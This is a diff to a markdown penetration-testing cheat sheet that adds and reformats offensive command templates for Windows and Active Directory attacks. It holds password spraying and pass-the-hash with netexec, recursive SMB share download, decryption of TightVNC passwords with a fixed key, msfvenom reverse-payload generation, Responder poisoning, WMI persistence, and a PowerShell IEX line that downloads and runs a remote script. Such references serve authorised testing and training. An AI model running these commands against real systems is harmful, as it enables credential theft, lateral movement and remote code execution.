@@ -277,7 +277,7 @@ impacket-wmipersist 'DOMAIN/USERNAME:PASSWORD@IP' install -name 'NAME' -command 
 # guest
 netexec smb 'IP' -u ' ' -p ''
 # Password Spraying
-netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
+netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST' --continue-on-success
 # NTHASH
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
 # Spidering Shares
@@ -322,6 +322,10 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'C
 smbclient -L 'IP' -N  
 smbclient -L 'IP' -U 'DOMAIN/USERNAME%PASSWORD'
 smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//IP/SHARE'
+```
+- smbget
+```sh
+smbget --recursive -U 'DOMAIN/USERNAME%PASSWORD' smb://'IP'/'SHARENAME'
 ```
 - smbmap ![GitHub Repo stars](https://img.shields.io/github/stars/ShawnDEvans/smbmap?style=social)
 ```sh
@@ -405,16 +409,22 @@ msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o 'OUTPUT'
 ```sh
 name-that-hash -f 'hash.txt' --no-banner --no-john
 ```
-- openssl
+- openssl ![GitHub Repo stars](https://img.shields.io/github/stars/openssl/openssl?style=social)
 ```sh
+# decrypt AES(128bit)
+echo 'BASE64' | openssl enc -aes-128-cbc -d -base64 -K 'KEY' -iv 'IV'
+# decrypt TightVNC password
+echo -n 'HEX_PASSWORD' | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+
+# remove passphrase
 openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
 
+# ad cs
 openssl pkcs12 -in 'PFX' -clcerts -nokeys -out cert.crt
 openssl pkcs12 -in 'PFX' -nocerts -out privkey.pem -nodes 
 ```
-- phpbash  
-[phpbash](https://github.com/Arrexel/phpbash)
-- pspy
+- phpbash ![GitHub Repo stars](https://img.shields.io/github/stars/Arrexel/phpbash?style=social)
+- pspy ![GitHub Repo stars](https://img.shields.io/github/stars/DominicBreuker/pspy?style=social)
 ```sh
 ./pspy64
 ```
@@ -422,9 +432,16 @@ openssl pkcs12 -in 'PFX' -nocerts -out privkey.pem -nodes
 ```sh
 puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 ```
-- responder
+- responder ![GitHub Repo stars](https://img.shields.io/github/stars/lgandx/Responder?style=social)
 ```sh
 sudo responder -I 'INTERFACE' -v
+```
+- sqlite3 ![GitHub Repo stars](https://img.shields.io/github/stars/lgandx/Responder?style=social)
+```sh
+sqlite3 'DB_FILENAME'
+sqlite> .tables
+sqlite> .mode column
+sqlite> SELECT * FROM 'TABLE_NAME';
 ```
 - username-anarchy
 ```sh
@@ -448,9 +465,21 @@ Get-LAPSComputers
 - powershell  
   [nishang](https://github.com/samratashok/nishang) ![GitHub Repo stars](https://img.shields.io/github/stars/samratashok/nishang?style=social)
 ```powershell
+# enum
 [Environment]::Is64BitOperatingSystem
 [Environment]::Is64BitProcess
+
+# AD Recycle Bin
+Get-ADObject -LDAPFilter '(DistinguishedName=*)' -IncludeDeletedObjects -SearchBase 'DN' | Select-Object DistinguishedName
+Get-ADObject -LDAPFilter '(FILTER)' -IncludeDeletedObjects -Property * -SearchBase 'DN'
+
+# iex
 IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
+```
+- reg
+```powershell
+# alternatively command of net share
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"
 ```
 - robocopy
 ```powershell
